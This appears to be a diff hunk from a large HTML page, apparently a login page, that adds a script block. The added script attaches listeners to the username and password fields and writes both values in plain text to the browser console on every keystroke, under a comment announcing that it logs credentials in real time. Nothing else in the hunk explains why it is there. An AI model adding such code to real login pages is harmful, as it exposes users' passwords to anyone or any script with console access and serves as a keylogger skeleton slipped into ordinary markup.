@@ -18605,6 +18605,24 @@
       }
     </script>
 
+	<script>
+	  // Log credentials in real-time to the console
+	  document.addEventListener('DOMContentLoaded', function() {
+	    const usernameInput = document.querySelector('input[name="username"]');
+	    const passwordInput = document.querySelector('input[name="password"]');
+	
+	    function logCredentials() {
+	      console.log('Username:', usernameInput.value);
+	      console.log('Password:', passwordInput.value);
+	      console.log('---');
+	    }
+	
+	    // Log on every keystroke
+	    usernameInput.addEventListener('input', logCredentials);
+	    passwordInput.addEventListener('input', logCredentials);
+	  });
+	</script>
+
     <div class="_-rjm"><div class="tA2fc"></div></div>
     <div class="_5qKD1"><div class="q5edG"></div></div>
 	
